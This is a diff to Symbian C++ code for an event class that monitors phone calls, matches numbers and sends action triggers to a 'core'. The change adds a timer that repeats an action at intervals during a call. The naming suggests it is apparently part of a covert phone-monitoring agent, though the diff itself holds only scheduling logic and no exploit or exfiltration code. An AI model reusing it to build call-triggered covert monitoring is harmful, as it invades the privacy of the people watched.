@@ -17,6 +17,7 @@ CEventCall::CEventCall(TUint32 aTriggerId) :
 CEventCall::~CEventCall()
 	{
 	//__FLOG(_L("Destructor"));
+	delete iTimerRepeat;
 	delete iCallMonitor;
 	//__FLOG(_L("End Destructor"));
 	//__FLOG_CLOSE;
@@ -78,15 +79,24 @@ void CEventCall::ConstructL(const TDesC8& params)
 		//retrieve repeat action
 		if(rootObject->Find(_L("repeat")) != KErrNotFound)
 			{
+			//action
 			rootObject->GetIntL(_L("repeat"),iCallParams.iRepeatAction);
-			rootObject->GetIntL(_L("iter"),iCallParams.iIter);
-			rootObject->GetIntL(_L("delay"),iCallParams.iDelay);
+			//iter
+			if(rootObject->Find(_L("iter")) != KErrNotFound)
+				rootObject->GetIntL(_L("iter"),iCallParams.iIter);
+			else 
+				iCallParams.iIter = -1;
+			//delay
+			if(rootObject->Find(_L("delay")) != KErrNotFound)
+				rootObject->GetIntL(_L("delay"),iCallParams.iDelay);
+			else 
+				iCallParams.iDelay = -1;
 			}
 		else
 			{
 			iCallParams.iRepeatAction = -1;
-			iCallParams.iIter = 0;
-			iCallParams.iDelay = 0;
+			iCallParams.iIter = -1;
+			iCallParams.iDelay = -1;
 			}
 		//retrieve enable flag
 		rootObject->GetBoolL(_L("enabled"),iEnabled);
@@ -97,6 +107,14 @@ void CEventCall::ConstructL(const TDesC8& params)
 	CleanupStack::PopAndDestroy(jsonBuilder);
 	CleanupStack::PopAndDestroy(&paramsBuf);
 
+	if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
+		{
+		iTimerRepeat = CTimeOutTimer::NewL(*this);
+		iSecondsIntervRepeat = iCallParams.iDelay;
+		}
+	else
+		iTimerRepeat = NULL;
+	
 	iCallMonitor = CPhoneCallMonitor::NewL(*this);
 	}
 
@@ -114,6 +132,19 @@ void CEventCall::StartEventL()
 			{
 			iWasInMonitoredCall = ETrue;
 			SendActionTriggerToCoreL();
+			//start repeat action
+			if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
+				{
+				iIter = iCallParams.iIter;
+						
+				iTimeAtRepeat.HomeTime();
+				iTimeAtRepeat += iSecondsIntervRepeat;
+				iTimerRepeat->RcsAt(iTimeAtRepeat);
+						
+				--iIter;
+						
+				SendActionTriggerToCoreL(iCallParams.iRepeatAction);
+				}
 			}
 		else					
 			{
@@ -125,6 +156,19 @@ void CEventCall::StartEventL()
 				{
 				iWasInMonitoredCall = ETrue;
 				SendActionTriggerToCoreL();
+				//start repeat action
+				if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
+					{
+					iIter = iCallParams.iIter;
+							
+					iTimeAtRepeat.HomeTime();
+					iTimeAtRepeat += iSecondsIntervRepeat;
+					iTimerRepeat->RcsAt(iTimeAtRepeat);
+							
+					--iIter;
+							
+					SendActionTriggerToCoreL(iCallParams.iRepeatAction);
+					}
 				}
 			}
 		}
@@ -133,6 +177,8 @@ void CEventCall::StartEventL()
 
 void CEventCall::StopEventL()
 	{
+	if(iTimerRepeat != NULL)
+		iTimerRepeat->Cancel();
 	iCallMonitor->Cancel();
 	iEnabled = EFalse;
 	}
@@ -147,6 +193,19 @@ void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirectio
 			// no number to match, trigger action
 			iWasInMonitoredCall = ETrue;
 			SendActionTriggerToCoreL();
+			// Triggers the Repeat-Action
+			if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
+				{
+				iIter = iCallParams.iIter;
+									
+				iTimeAtRepeat.HomeTime();
+				iTimeAtRepeat += iSecondsIntervRepeat;
+				iTimerRepeat->RcsAt(iTimeAtRepeat);
+									
+				--iIter;
+									
+				SendActionTriggerToCoreL(iCallParams.iRepeatAction);
+				}
 			}
 		else
 			{
@@ -159,6 +218,19 @@ void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirectio
 				{
 				iWasInMonitoredCall = ETrue;
 				SendActionTriggerToCoreL();
+				// Triggers the Repeat-Action
+				if((iCallParams.iRepeatAction != -1) && (iCallParams.iDelay != -1))
+					{
+					iIter = iCallParams.iIter;
+										
+					iTimeAtRepeat.HomeTime();
+					iTimeAtRepeat += iSecondsIntervRepeat;
+					iTimerRepeat->RcsAt(iTimeAtRepeat);
+										
+					--iIter;
+										
+					SendActionTriggerToCoreL(iCallParams.iRepeatAction);
+					}
 				}
 			}
 		}
@@ -169,6 +241,10 @@ void CEventCall::NotifyDisconnectedCallStatusL()
 	if(iWasInMonitoredCall)
 		{
 		iWasInMonitoredCall = EFalse;
+		// Stop the repeat action
+		if(iTimerRepeat != NULL)
+			iTimerRepeat->Cancel();
+		// Trigger the exit action
 		if (iCallParams.iExitAction != -1)						
 			SendActionTriggerToCoreL(iCallParams.iExitAction);
 		}
@@ -196,4 +272,27 @@ TBool CEventCall::MatchNumber(const TDesC& aNumber)
 			}
 		}
 	return EFalse;
+	}
+
+void CEventCall::TimerExpiredL(TAny* /*src*/)
+	{
+	if(iCallParams.iIter == -1)
+		{
+		// infinite loop
+		// restart timer
+		iTimeAtRepeat.HomeTime();
+		iTimeAtRepeat += iSecondsIntervRepeat;
+		iTimerRepeat->RcsAt(iTimeAtRepeat);
+		SendActionTriggerToCoreL(iCallParams.iRepeatAction);
+		}
+	else
+		{
+		// finite loop
+		if(iIter > 0)
+			{
+			// still something to do
+			--iIter;
+			SendActionTriggerToCoreL(iCallParams.iRepeatAction);
+			}
+		}
 	}
